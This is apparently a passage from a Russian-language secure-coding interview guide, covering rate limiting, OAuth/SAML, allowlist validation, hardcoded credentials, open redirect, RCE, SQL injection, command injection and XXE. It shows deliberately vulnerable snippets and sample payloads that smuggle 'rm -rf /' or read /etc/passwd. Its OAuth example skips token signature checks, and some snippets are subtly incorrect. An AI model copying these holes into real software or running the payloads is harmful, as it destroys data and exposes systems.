    response.headers['X-Framework'] = 'Django/3.2'  # Раскрытие фреймворка
    return response
```

**4. Открытые отладочные интерфейсы:**
```python
# ПЛОХО: Отладка включена в production
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')  # Отладка и открытый доступ
```

**5. Неиспользуемые импорты и функции:**
```python
# ПЛОХО: Импортированы небезопасные функции, которые не используются
import os
import subprocess
import eval
import exec

# Но они доступны для случайного использования
```

**6. Избыточные зависимости:**
```python
# requirements.txt
# ПЛОХО: Много неиспользуемых зависимостей с известными уязвимостями
flask==2.0.0
django==3.2.0  # Не используется, но установлен
old-vulnerable-library==1.0.0  # Уязвимая библиотека
```

**7. Неограниченные входные точки:**
```python
# ПЛОХО: Принимает данные из любых источников без валидации
@app.route('/process', methods=['POST'])
def process():
    data = request.json  # Без валидации источника
    # Обработка данных
    pass
```

**Безопасный код (минимизация поверхности атаки):**
```python
# ХОРОШО: Только необходимые эндпоинты
@app.route('/api/v2/users', methods=['GET', 'POST'])  # Только нужные методы
@require_auth  # Требуется аутентификация
def users():
    pass

# ХОРОШО: Отладочная информация отключена в production
if __name__ == '__main__':
    app.run(debug=os.getenv('DEBUG', 'False') == 'True', host='127.0.0.1')

# ХОРОШО: Минимальные заголовки
@app.after_request
def add_headers(response):
    # Не раскрываем информацию о технологиях
    response.headers.pop('X-Powered-By', None)
    return response

# ХОРОШО: Только используемые методы
@app.route('/users/<id>', methods=['GET', 'PUT'])  # Только необходимые
def user(id):
    pass
```

---

### 92. Как правильно реализовать rate limiting на gateway?

**Ответ:** Правильная реализация **rate limiting** на gateway должна ограничивать количество запросов от клиента для предотвращения злоупотреблений и DDoS-атак.

**1. Использование Redis для хранения счётчиков (Token Bucket):**
```python
import redis
import time
from functools import wraps

redis_client = redis.Redis()

class RateLimiter:
    def __init__(self, requests_per_minute=60, requests_per_hour=1000):
        self.requests_per_minute = requests_per_minute
        self.requests_per_hour = requests_per_hour
    
    def is_allowed(self, identifier: str) -> tuple[bool, dict]:
        """Проверяет, разрешён ли запрос"""
        now = time.time()
        minute_key = f"rate_limit:minute:{identifier}"
        hour_key = f"rate_limit:hour:{identifier}"
        
        # Счётчик запросов за минуту
        minute_count = redis_client.incr(minute_key)
        if minute_count == 1:
            redis_client.expire(minute_key, 60)
        
        # Счётчик запросов за час
        hour_count = redis_client.incr(hour_key)
        if hour_count == 1:
            redis_client.expire(hour_key, 3600)
        
        # Проверка лимитов
        allowed = (minute_count <= self.requests_per_minute and 
                  hour_count <= self.requests_per_hour)
        
        info = {
            'minute_remaining': max(0, self.requests_per_minute - minute_count),
            'hour_remaining': max(0, self.requests_per_hour - hour_count),
            'retry_after': 60 if minute_count > self.requests_per_minute else None
        }
        
        return allowed, info

limiter = RateLimiter(requests_per_minute=60, requests_per_hour=1000)

def rate_limit_decorator(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # Идентификация клиента (IP, API key, user ID)
        identifier = request.remote_addr  # Или request.headers.get('X-API-Key')
        
        allowed, info = limiter.is_allowed(identifier)
        
        if not allowed:
            response = make_response("Rate limit exceeded", 429)
            response.headers['X-RateLimit-Limit'] = str(limiter.requests_per_minute)
            response.headers['X-RateLimit-Remaining'] = str(info['minute_remaining'])
            if info['retry_after']:
                response.headers['Retry-After'] = str(info['retry_after'])
            return response
        
        response = f(*args, **kwargs)
        response.headers['X-RateLimit-Limit'] = str(limiter.requests_per_minute)
        response.headers['X-RateLimit-Remaining'] = str(info['minute_remaining'])
        return response
    
    return decorated_function

@app.route('/api/data')
@rate_limit_decorator
def get_data():
    return {"data": "..."}
```

**2. Использование алгоритма Sliding Window:**
```python
class SlidingWindowRateLimiter:
    def __init__(self, max_requests: int, window_seconds: int):
        self.max_requests = max_requests
        self.window_seconds = window_seconds
    
    def is_allowed(self, identifier: str) -> bool:
        now = time.time()
        window_start = now - self.window_seconds
        
        # Удаление старых запросов
        key = f"rate_limit:sliding:{identifier}"
        redis_client.zremrangebyscore(key, 0, window_start)
        
        # Подсчёт текущих запросов
        current_count = redis_client.zcard(key)
        
        if current_count < self.max_requests:
            # Добавление текущего запроса
            redis_client.zadd(key, {str(now): now})
            redis_client.expire(key, self.window_seconds)
            return True
        
        return False
```

**3. Использование готовых решений (Nginx, API Gateway):**
```nginx
# Nginx rate limiting
limit_req_zone $binary_remote_addr zone=api_limit:10m rate=10r/s;

server {
    location /api/ {
        limit_req zone=api_limit burst=20 nodelay;
        proxy_pass http://backend;
    }
}
```

**4. Использование специализированных gateway (Kong, Ambassador):**
```yaml
# Kong rate limiting plugin
plugins:
- name: rate-limiting
  config:
    minute: 100
    hour: 1000
    policy: redis
    redis:
      host: redis
      port: 6379
```

**5. Многоуровневый rate limiting:**
```python
class MultiLevelRateLimiter:
    def __init__(self):
        self.limiters = {
            'global': RateLimiter(10000, 100000),  # Глобальный лимит
            'per_ip': RateLimiter(60, 1000),       # На IP
            'per_user': RateLimiter(100, 5000),    # На пользователя
        }
    
    def is_allowed(self, ip: str, user_id: str = None) -> bool:
        # Проверка всех уровней
        if not self.limiters['global'].is_allowed('global')[0]:
            return False
        
        if not self.limiters['per_ip'].is_allowed(ip)[0]:
            return False
        
        if user_id and not self.limiters['per_user'].is_allowed(user_id)[0]:
            return False
        
        return True
```

**6. Rate limiting с приоритетами:**
```python
class PriorityRateLimiter:
    def __init__(self):
        self.limits = {
            'premium': RateLimiter(1000, 10000),
            'standard': RateLimiter(100, 1000),
            'free': RateLimiter(10, 100),
        }
    
    def is_allowed(self, identifier: str, tier: str = 'free') -> bool:
        limiter = self.limits.get(tier, self.limits['free'])
        return limiter.is_allowed(identifier)[0]
```

**Рекомендации:**
- Использовать Redis для распределённого rate limiting
- Применять разные лимиты для разных типов клиентов
- Возвращать информативные заголовки (X-RateLimit-*)
- Логировать превышения лимитов для анализа
- Использовать graceful degradation вместо полного блокирования

---

### 93. Как реализуется федеративная аутентификация?

**Ответ:** **Федеративная аутентификация (Federated Authentication)** позволяет пользователям аутентифицироваться через внешнего провайдера удостоверений (IdP), вместо хранения учётных данных в приложении.

**Реализация с использованием OAuth 2.0 / OpenID Connect:**

```python
from flask import Flask, redirect, request, session
import requests
import jwt

app = Flask(__name__)
app.secret_key = 'secret'

# Конфигурация OAuth провайдера (Google, Microsoft, Okta и т.д.)
OAUTH_CONFIG = {
    'client_id': 'your-client-id',
    'client_secret': 'your-client-secret',
    'authorization_endpoint': 'https://accounts.google.com/o/oauth2/auth',
    'token_endpoint': 'https://oauth2.googleapis.com/token',
    'userinfo_endpoint': 'https://www.googleapis.com/oauth2/v3/userinfo',
    'redirect_uri': 'http://localhost:5000/callback',
    'scopes': 'openid email profile'
}

@app.route('/login')
def login():
    # Редирект на провайдера для аутентификации
    auth_url = (
        f"{OAUTH_CONFIG['authorization_endpoint']}?"
        f"client_id={OAUTH_CONFIG['client_id']}&"
        f"redirect_uri={OAUTH_CONFIG['redirect_uri']}&"
        f"response_type=code&"
        f"scope={OAUTH_CONFIG['scopes']}&"
        f"state={generate_state()}"  # CSRF защита
    )
    return redirect(auth_url)

@app.route('/callback')
def callback():
    # Получение authorization code
    code = request.args.get('code')
    state = request.args.get('state')
    
    # Проверка state (CSRF защита)
    if state != session.get('oauth_state'):
        return "Invalid state", 400
    
    # Обмен code на access token
    token_response = requests.post(
        OAUTH_CONFIG['token_endpoint'],
        data={
            'code': code,
            'client_id': OAUTH_CONFIG['client_id'],
            'client_secret': OAUTH_CONFIG['client_secret'],
            'redirect_uri': OAUTH_CONFIG['redirect_uri'],
            'grant_type': 'authorization_code'
        }
    )
    
    tokens = token_response.json()
    access_token = tokens['access_token']
    id_token = tokens.get('id_token')
    
    # Верификация ID token (JWT)
    if id_token:
        decoded = jwt.decode(
            id_token,
            # Получение публичного ключа для проверки подписи
            verify=False  # В реальности нужно проверить подпись
        )
        user_info = decoded
    else:
        # Получение информации о пользователе
        user_response = requests.get(
            OAUTH_CONFIG['userinfo_endpoint'],
            headers={'Authorization': f'Bearer {access_token}'}
        )
        user_info = user_response.json()
    
    # Сохранение сессии пользователя
    session['user'] = {
        'email': user_info.get('email'),
        'name': user_info.get('name'),
        'sub': user_info.get('sub')  # Уникальный идентификатор
    }
    
    return redirect('/dashboard')
```

**Реализация с использованием SAML 2.0:**

```python
from onelogin.saml2.auth import OneLogin_Saml2_Auth
from flask import Flask, request, redirect, session

app = Flask(__name__)

def init_saml_auth(req):
    auth = OneLogin_Saml2_Auth(req, custom_base_path='/path/to/saml')
    return auth

@app.route('/sso/saml')
def saml():
    req = prepare_flask_request(request)
    auth = init_saml_auth(req)
    return redirect(auth.login())

@app.route('/sso/saml/acs', methods=['POST'])
def acs():
    req = prepare_flask_request(request)
    auth = init_saml_auth(req)
    auth.process_response()
    
    if auth.is_authenticated():
        session['user'] = auth.get_attributes()
        return redirect('/dashboard')
    else:
        return "Authentication failed", 403
```

**Безопасные практики:**
1. **Проверка подписи токенов** — всегда проверяйте подпись JWT/SAML
2. **Проверка issuer и audience** — убедитесь, что токен от правильного провайдера
3. **CSRF защита** — использование state parameter в OAuth
4. **HTTPS обязателен** — все коммуникации должны быть зашифрованы
5. **Проверка срока действия токенов** — проверяйте exp и nbf claims
6. **Хранение секретов** — храните client_secret в безопасном месте

---

### 94. Какой код реализует безопасную валидацию входных данных по allowlist?

**Ответ:** Безопасная валидация по **allowlist** (белый список) разрешает только определённые, известные безопасные значения.

**Пример безопасной валидации:**

```python
import re
from enum import Enum

# 1. Валидация по фиксированному списку значений
class UserRole(str, Enum):
    ADMIN = "admin"
    USER = "user"
    GUEST = "guest"

def validate_role(role: str) -> str:
    """Валидация роли по allowlist"""
    if role not in [r.value for r in UserRole]:
        raise ValueError(f"Invalid role: {role}")
    return role

# 2. Валидация строк по паттерну (allowlist символов)
def validate_username(username: str) -> str:
    """Валидация имени пользователя: только буквы, цифры, подчёркивания"""
    # Allowlist: только [a-zA-Z0-9_], длина 3-20
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Username must contain only letters, numbers, and underscores, 3-20 characters")
    return username

# 3. Валидация файловых расширений
ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.pdf', '.txt'}

def validate_filename(filename: str) -> str:
    """Валидация имени файла по allowlist расширений"""
    ext = os.path.splitext(filename)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError(f"File extension not allowed: {ext}")
    return filename

# 4. Валидация HTTP методов
ALLOWED_METHODS = {'GET', 'POST', 'PUT', 'DELETE'}

def validate_http_method(method: str) -> str:
    """Валидация HTTP метода"""
    method = method.upper()
    if method not in ALLOWED_METHODS:
        raise ValueError(f"HTTP method not allowed: {method}")
    return method

# 5. Валидация URL (whitelist доменов)
ALLOWED_DOMAINS = {'example.com', 'trusted-site.com'}

def validate_url(url: str) -> str:
    """Валидация URL по allowlist доменов"""
    from urllib.parse import urlparse
    parsed = urlparse(url)
    
    if parsed.netloc not in ALLOWED_DOMAINS:
        raise ValueError(f"Domain not allowed: {parsed.netloc}")
    
    # Дополнительная проверка протокола
    if parsed.scheme not in {'http', 'https'}:
        raise ValueError(f"Protocol not allowed: {parsed.scheme}")
    
    return url

# 6. Валидация цвета (hex)
def validate_color(color: str) -> str:
    """Валидация цвета в формате hex (#RRGGBB)"""
    if not re.match(r'^#[0-9A-Fa-f]{6}$', color):
        raise ValueError("Color must be in format #RRGGBB")
    return color.upper()

# 7. Валидация по регулярному выражению (строгий паттерн)
def validate_email(email: str) -> str:
    """Валидация email по строгому паттерну"""
    # Строгий allowlist паттерн для email
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if not re.match(pattern, email):
        raise ValueError("Invalid email format")
    return email.lower()

# 8. Валидация ID (UUID)
def validate_uuid(uuid_str: str) -> str:
    """Валидация UUID"""
    uuid_pattern = r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$'
    if not re.match(uuid_pattern, uuid_str, re.IGNORECASE):
        raise ValueError("Invalid UUID format")
    return uuid_str.lower()

# 9. Комплексная валидация с использованием библиотеки
from marshmallow import Schema, fields, validate, ValidationError

class UserSchema(Schema):
    username = fields.Str(
        required=True,
        validate=validate.Regexp(r'^[a-zA-Z0-9_]{3,20}$')
    )
    email = fields.Email(required=True)
    role = fields.Str(
        required=True,
        validate=validate.OneOf(['admin', 'user', 'guest'])
    )
    age = fields.Int(
        required=True,
        validate=validate.Range(min=18, max=120)
    )

def validate_user_data(data: dict) -> dict:
    """Валидация данных пользователя"""
    schema = UserSchema()
    try:
        return schema.load(data)
    except ValidationError as err:
        raise ValueError(err.messages)

# Использование
try:
    user_data = validate_user_data({
        'username': 'john_doe',
        'email': 'john@example.com',
        'role': 'user',
        'age': 25
    })
except ValueError as e:
    print(f"Validation error: {e}")
```

**Принципы безопасной валидации по allowlist:**
1. **Определите точно, что разрешено** — создайте явный список разрешённых значений
2. **Отклоняйте всё остальное** — если значение не в allowlist, отклоняйте его
3. **Нормализуйте данные** — приводите к единому формату (lowercase, trim и т.д.)
4. **Используйте строгие регулярные выражения** — не используйте `.*` или широкие паттерны
5. **Валидируйте на стороне сервера** — не полагайтесь только на клиентскую валидацию

---

### 95. Какой код демонстрирует анти-паттерн «hardcoded credentials»?

**Ответ:** Анти-паттерн **"hardcoded credentials" (хардкод учётных данных, CWE-798)** — это встраивание паролей, ключей и других секретов непосредственно в исходный код.

**Примеры небезопасного кода:**

**1. Хардкод паролей:**
```python
# ПЛОХО: Пароль в коде
DATABASE_PASSWORD = "MySecretPassword123!"
db = connect("localhost", "admin", DATABASE_PASSWORD)

# ПЛОХО: Пароль в строке подключения
connection_string = "postgresql://user:password123@localhost/db"
```

**2. Хардкод API ключей:**
```python
# ПЛОХО: API ключ в коде
API_KEY = "sk_live_51AbCdEfGhIjKlMnOpQrStUvWxYz"
response = requests.get("https://api.example.com/data", 
                       headers={"Authorization": f"Bearer {API_KEY}"})

# ПЛОХО: Ключ доступа AWS
AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
```

**3. Хардкод токенов:**
```python
# ПЛОХО: JWT токен в коде
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
headers = {"Authorization": f"Bearer {TOKEN}"}
```

**4. Хардкод в конфигурационных файлах:**
```python
# config.py - ПЛОХО
DATABASE = {
    'host': 'localhost',
    'user': 'admin',
    'password': 'super_secret_password'  # В открытом виде
}

# settings.json - ПЛОХО
{
    "api_key": "secret_api_key_12345",
    "database_password": "db_pass"
}
```

**5. Хардкод в комментариях:**
```python
# ПЛОХО: Секреты в комментариях
# Для тестирования используйте: admin / TestPassword123
# API Key: sk_test_1234567890abcdef
```

**6. Хардкод в Docker-образах:**
```dockerfile
# Dockerfile - ПЛОХО
ENV DB_PASSWORD=my_secret_password
ENV API_KEY=secret_key_12345
```

**Безопасные альтернативы:**

**1. Использование переменных окружения:**
```python
# ХОРОШО: Использование переменных окружения
import os

DATABASE_PASSWORD = os.getenv('DATABASE_PASSWORD')
if not DATABASE_PASSWORD:
    raise ValueError("DATABASE_PASSWORD environment variable not set")

db = connect("localhost", "admin", DATABASE_PASSWORD)
```

**2. Использование файлов с секретами (не в репозитории):**
```python
# ХОРОШО: Чтение из файла, который не в git
import json

with open('/etc/app/secrets.json', 'r') as f:
    secrets = json.load(f)

DATABASE_PASSWORD = secrets['database_password']
```

**3. Использование систем управления секретами:**
```python
# ХОРОШО: Использование HashiCorp Vault
import hvac

client = hvac.Client(url='http://vault:8200')
client.token = os.getenv('VAULT_TOKEN')

secret = client.secrets.kv.v2.read_secret_version(path='database')
DATABASE_PASSWORD = secret['data']['data']['password']
```

```python
# ХОРОШО: Использование AWS Secrets Manager
import boto3
import json

secrets_client = boto3.client('secretsmanager')
secret = secrets_client.get_secret_value(SecretId='database/password')
DATABASE_PASSWORD = json.loads(secret['SecretString'])['password']
```

**4. Использование .env файлов (не в git):**
```python
# .env (не в git)
DATABASE_PASSWORD=my_secret_password
API_KEY=secret_key

# config.py
from dotenv import load_dotenv
load_dotenv()

DATABASE_PASSWORD = os.getenv('DATABASE_PASSWORD')
```

**5. Использование Docker secrets:**
```dockerfile
# Dockerfile - ХОРОШО
# Секреты передаются через docker secrets, не хардкодятся
```

**6. Использование Kubernetes secrets:**
```yaml
# secret.yaml (зашифрован)
apiVersion: v1
kind: Secret
metadata:
  name: db-secret
data:
  password: <base64-encoded-password>
```

**Рекомендации:**
- Никогда не коммитьте секреты в git
- Используйте `.gitignore` для исключения файлов с секретами
- Используйте переменные окружения или системы управления секретами
- Ротируйте секреты регулярно
- Используйте статический анализ для поиска хардкод секретов в коде

---

### 96. Какой тип уязвимости реализуется в коде: header("Location: " . $_GET['url'])?

**Ответ:** В данном коде присутствует уязвимость **Open Redirect (CWE-601)** — открытое перенаправление.

**Проблема:** Пользовательский ввод из `$_GET['url']` напрямую используется для HTTP-заголовка `Location` без валидации, что позволяет злоумышленнику перенаправить пользователя на произвольный сайт.

**Пример атаки:**
```php
// Злонамеренный запрос
// /redirect.php?url=http://evil.com/phishing

header("Location: " . $_GET['url']);
// Пользователь будет перенаправлен на evil.com
```

**Безопасное исправление (whitelist разрешённых URL):**
```php
<?php
// Whitelist разрешённых доменов
$allowed_domains = [
    'example.com',
    'trusted-partner.com'
];

function safe_redirect($url) {
    global $allowed_domains;
    
    // Парсинг URL
    $parsed = parse_url($url);
    
    // Проверка схемы
    if (!in_array($parsed['scheme'], ['http', 'https'])) {
        die("Invalid scheme");
    }
    
    // Проверка домена по whitelist
    if (!in_array($parsed['host'], $allowed_domains)) {
        die("Domain not allowed");
    }
    
    header("Location: " . $url);
    exit();
}

// Использование
$url = $_GET['url'] ?? 'https://example.com';
safe_redirect($url);
```

**Альтернативное исправление (использование ID вместо URL):**
```php
<?php
// Маппинг ID на разрешённые URL
$redirect_map = [
    'home' => 'https://example.com/home',
    'login' => 'https://example.com/login',
    'dashboard' => 'https://example.com/dashboard'
];

$redirect_id = $_GET['id'] ?? 'home';

if (!isset($redirect_map[$redirect_id])) {
    die("Invalid redirect ID");
}

header("Location: " . $redirect_map[$redirect_id]);
exit();
```

**Дополнительные меры защиты:**
```php
<?php
function safe_redirect($url, $allowed_domains) {
    $parsed = parse_url($url);
    
    // Валидация
    if (!$parsed || !isset($parsed['host'])) {
        die("Invalid URL");
    }
    
    // Проверка whitelist
    if (!in_array($parsed['host'], $allowed_domains)) {
        die("Domain not allowed");
    }
    
    // Проверка на фишинг (не разрешать похожие домены)
    foreach ($allowed_domains as $domain) {
        if (strpos($parsed['host'], $domain) !== false && 
            $parsed['host'] !== $domain) {
            die("Suspicious domain");
        }
    }
    
    // Использование относительных путей для внутренних редиректов
    if ($parsed['host'] === $_SERVER['HTTP_HOST']) {
        header("Location: " . $parsed['path']);
    } else {
        header("Location: " . $url);
    }
    exit();
}
```

---

### 97. Какой вариант кода уязвим к удалённому выполнению кода (RCE)?

**Ответ:** Уязвимость **RCE (Remote Code Execution, CWE-94)** возникает, когда злоумышленник может выполнить произвольный код на сервере.

**Примеры уязвимого кода:**

**1. Использование eval() с пользовательским вводом:**
```python
# УЯЗВИМО
code = request.args.get('code')
result = eval(code)  # Выполнит любой Python код
# Атака: ?code=__import__('os').system('rm -rf /')
```

**2. Использование exec():**
```python
# УЯЗВИМО
user_input = request.form.get('command')
exec(user_input)  # Выполнит любой код
```

**3. Использование os.system() с пользовательским вводом:**
```python
# УЯЗВИМО
filename = request.args.get('file')
os.system(f"cat {filename}")  # Command injection
# Атака: ?file=/etc/passwd; rm -rf /
```

**4. Десериализация небезопасных данных:**
```python
# УЯЗВИМО
import pickle
data = request.data
obj = pickle.loads(data)  # Может выполнить код при десериализации
```

**5. Использование subprocess с shell=True:**
```python
# УЯЗВИМО
user_input = request.args.get('cmd')
subprocess.run(f"echo {user_input}", shell=True)  # Command injection
```

**6. Использование шаблонизатора с выполнением кода:**
```python
# УЯЗВИМО - если шаблонизатор выполняет код
template = request.args.get('template')
render_template(template)  # Может выполнить код, если template содержит код
```

**7. Использование __import__() с пользовательским вводом:**
```python
# УЯЗВИМО
module_name = request.args.get('module')
module = __import__(module_name)  # Может импортировать любой модуль
```

**8. PHP: использование eval(), exec(), system():**
```php
<?php
// УЯЗВИМО
$code = $_GET['code'];
eval($code);  // Выполнит любой PHP код

// УЯЗВИМО
$cmd = $_GET['cmd'];
exec($cmd);  // Выполнит системную команду

// УЯЗВИМО
$file = $_GET['file'];
include($file);  // Может включить любой файл (LFI/RFI)
?>
```

**Безопасные альтернативы:**

```python
# БЕЗОПАСНО: Никогда не выполняйте пользовательский код
# Вместо eval() используйте безопасные альтернативы

# 1. Параметризованные запросы вместо построения кода
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# 2. Валидация и whitelist вместо выполнения
ALLOWED_COMMANDS = {'sum', 'multiply'}
if command in ALLOWED_COMMANDS:
    result = safe_execute(command, args)

# 3. Безопасная десериализация
import json
data = json.loads(user_input)  # Безопасно, не выполняет код

# 4. Безопасное выполнение команд
subprocess.run(['ls', filename], shell=False)  # Безопасно

# 5. Sandbox для выполнения кода (если необходимо)
from RestrictedPython import compile_restricted
code = compile_restricted(user_code, '<inline>', 'exec')
exec(code)  # В ограниченном окружении
```

---

### 98. Какой вариант кода уязвим к SQL-инъекции?

**Ответ:** Уязвимость **SQL Injection (CWE-89)** возникает при конкатенации пользовательского ввода в SQL-запросы без экранирования.

**Примеры уязвимого кода:**

**1. Прямая конкатенация в строку:**
```python
# УЯЗВИМО
user_id = request.args.get('id')
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)
```

**2. Конкатенация через + или %:**
```python
# УЯЗВИМО
username = request.form.get('username')
query = "SELECT * FROM users WHERE username = '" + username + "'"
cursor.execute(query)

# УЯЗВИМО
query = "SELECT * FROM users WHERE username = '%s'" % username
cursor.execute(query)
```

**3. Использование .format() с SQL:**
```python
# УЯЗВИМО
table_name = request.args.get('table')
query = "SELECT * FROM {}".format(table_name)
cursor.execute(query)
```

**4. PHP: конкатенация в запрос:**
```php
<?php
// УЯЗВИМО
$user_id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = " . $user_id;
$result = mysqli_query($conn, $query);

// УЯЗВИМО
$username = $_POST['username'];
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $query);
?>
```

**5. Использование неправильных методов экранирования:**
```python
# УЯЗВИМО - addslashes() недостаточно для SQL
import MySQLdb
username = request.form.get('username')
escaped = MySQLdb.escape_string(username)  # Не всегда достаточно
query = f"SELECT * FROM users WHERE username = '{escaped}'"
```

**6. Динамическое построение WHERE:**
```python
# УЯЗВИМО
filters = []
if request.args.get('name'):
    filters.append(f"name = '{request.args.get('name')}'")
if request.args.get('email'):
    filters.append(f"email = '{request.args.get('email')}'")

query = "SELECT * FROM users WHERE " + " AND ".join(filters)
```

**Безопасные альтернативы:**

**1. Параметризованные запросы (prepared statements):**
```python
# БЕЗОПАСНО
user_id = request.args.get('id')
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# БЕЗОПАСНО - несколько параметров
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND email = %s",
    (username, email)
)
```

**2. Использование ORM:**
```python
# БЕЗОПАСНО - SQLAlchemy
user = User.query.filter_by(username=username).first()

# БЕЗОПАСНО - Django ORM
User.objects.filter(username=username)
```

**3. Валидация и whitelist для динамических частей:**
```python
# БЕЗОПАСНО - whitelist для имён таблиц
ALLOWED_TABLES = {'users', 'products', 'orders'}
table = request.args.get('table')
if table not in ALLOWED_TABLES:
    raise ValueError("Invalid table")

query = f"SELECT * FROM {table}"  # Безопасно, так как проверено
```

**4. Использование безопасных методов экранирования:**
```python
# БЕЗОПАСНО - использование identifier quoting
from sqlalchemy import text
table_name = 'users'  # Валидировано
query = text(f"SELECT * FROM {table_name}")
```

**Рекомендации:**
- Всегда используйте параметризованные запросы
- Используйте ORM вместо прямых SQL-запросов
- Валидируйте пользовательский ввод
- Используйте whitelist для динамических частей запроса (имена таблиц, колонок)

---

### 99. Как реализуется защита от command injection в Python?

**Ответ:** Защита от **Command Injection (CWE-78)** в Python реализуется следующими способами:

**1. Использование subprocess с списком аргументов (без shell):**
```python
import subprocess

# БЕЗОПАСНО: передача аргументов списком
user_input = request.args.get('filename')
subprocess.run(['ls', '-l', user_input])  # user_input передаётся как отдельный аргумент

# ОПАСНО: использование shell=True
subprocess.run(f"ls -l {user_input}", shell=True)  # Уязвимо к инъекции
```

**2. Валидация и санитизация входных данных:**
```python
import re
import shlex

def validate_filename(filename):
    """Валидация имени файла по allowlist"""
    # Только безопасные символы
    if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
        raise ValueError("Invalid filename")
    
    # Запрет path traversal
    if '..' in filename or '/' in filename:
        raise ValueError("Path traversal detected")
    
    return filename

# Использование
safe_filename = validate_filename(user_input)
subprocess.run(['cat', safe_filename])
```

**3. Использование shlex.quote() для экранирования:**
```python
import shlex

user_input = request.args.get('path')
# Экранирование специальных символов
safe_path = shlex.quote(user_input)
subprocess.run(f"ls {safe_path}", shell=True)  # Безопасно, но лучше избегать shell
```

**4. Ограничение путей выполнения:**
```python
from pathlib import Path

BASE_DIR = Path("/var/www/uploads")

def safe_execute_command(filename):
    # Нормализация пути
    filepath = (BASE_DIR / filename).resolve()
    
    # Проверка, что путь внутри BASE_DIR
    try:
        filepath.relative_to(BASE_DIR.resolve())
    except ValueError:
        raise ValueError("Path outside allowed directory")
    
    # Безопасное выполнение
    subprocess.run(['cat', str(filepath)])
```

**5. Использование whitelist разрешённых команд:**
```python
ALLOWED_COMMANDS = {
    'list': ['ls', '-l'],
    'count': ['wc', '-l'],
    'grep': ['grep']
}

def execute_command(command_name, *args):
    if command_name not in ALLOWED_COMMANDS:
        raise ValueError("Command not allowed")
    
    cmd = ALLOWED_COMMANDS[command_name].copy()
    cmd.extend(args)
    
    subprocess.run(cmd)  # Безопасно
```

**6. Ограничение прав выполнения:**
```python
import subprocess

def restricted_execute(cmd, args):
    # Выполнение с ограниченными правами
    result = subprocess.run(
        cmd + args,
        shell=False,
        timeout=5,  # Таймаут
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False  # Не выбрасывать исключение при ошибке
    )
    return result
```

**7. Использование специализированных библиотек:**
```python
# Использование библиотек вместо прямых команд
import shutil  # Вместо shell команд для файловых операций

# Вместо: subprocess.run(['cp', src, dst])
shutil.copy(src, dst)  # Безопасно

# Вместо: subprocess.run(['rm', '-rf', path])
os.remove(path)  # Безопасно, но нужно валидировать путь
```

**8. Полный пример безопасной реализации:**
```python
import subprocess
import re
from pathlib import Path

class SafeCommandExecutor:
    def __init__(self, base_dir):
        self.base_dir = Path(base_dir).resolve()
    
    def list_files(self, directory):
        """Безопасное выполнение ls"""
        # Валидация директории
        if not re.match(r'^[a-zA-Z0-9._/-]+$', directory):
            raise ValueError("Invalid directory name")
        
        dir_path = (self.base_dir / directory.lstrip('/')).resolve()
        
        # Проверка, что путь внутри base_dir
        try:
            dir_path.relative_to(self.base_dir)
        except ValueError:
            raise ValueError("Path outside allowed directory")
        
        # Безопасное выполнение
        result = subprocess.run(
            ['ls', '-l', str(dir_path)],
            shell=False,
            capture_output=True,
            text=True,
            timeout=5
        )
        
        if result.returncode != 0:
            raise RuntimeError(f"Command failed: {result.stderr}")
        
        return result.stdout

# Использование
executor = SafeCommandExecutor("/var/www/uploads")
files = executor.list_files("documents")
```

**Рекомендации:**
- Никогда не используйте `shell=True` с пользовательским вводом
- Всегда передавайте аргументы списком в `subprocess.run()`
- Валидируйте и санитизируйте входные данные
- Используйте whitelist для команд и путей
- Ограничивайте права выполнения
- Используйте таймауты для команд
- Предпочитайте библиотеки вместо shell команд

---

### 100. Какие методы используются для защиты от XXE-атак?

**Ответ:** **XXE (XML External Entity, CWE-611)** — уязвимость, позволяющая атакующему читать локальные файлы или выполнять удалённые запросы через обработку XML.

**Методы защиты:**

**1. Отключение обработки внешних сущностей:**
```python
from lxml import etree

# БЕЗОПАСНО: отключение внешних сущностей
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(xml_file, parser)
```

```java
// Java - отключение внешних сущностей
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setExpandEntityReferences(false);
```

**2. Валидация и фильтрация XML:**
```python
import re

def sanitize_xml(xml_string):
    """Удаление опасных конструкций из XML"""
    # Удаление DOCTYPE
    xml_string = re.sub(r'<!DOCTYPE[^>]*>', '', xml_string)
    
    # Удаление внешних сущностей
    xml_string = re.sub(r'&[^;]+;', '', xml_string)
    
    return xml_string

# Использование
safe_xml = sanitize_xml(user_xml)
```

**3. Использование безопасных парсеров:**
```python
# Python: использование defusedxml
from defusedxml import ElementTree

# defusedxml автоматически отключает опасные функции
tree = ElementTree.parse(xml_file)  # Безопасно
```

```python
# Python: использование xml.etree.ElementTree с ограничениями
import xml.etree.ElementTree as ET
from xml.etree.ElementTree import XMLParser

class SafeXMLParser(XMLParser):
    def __init__(self):
        super().__init__()
        # Отключение внешних сущностей
        self.parser.UseForeignDTD = False

parser = SafeXMLParser()
tree = ET.parse(xml_file, parser=parser)
```

**4. Whitelist разрешённых элементов:**
```python
ALLOWED_ELEMENTS = {'name', 'email', 'phone'}
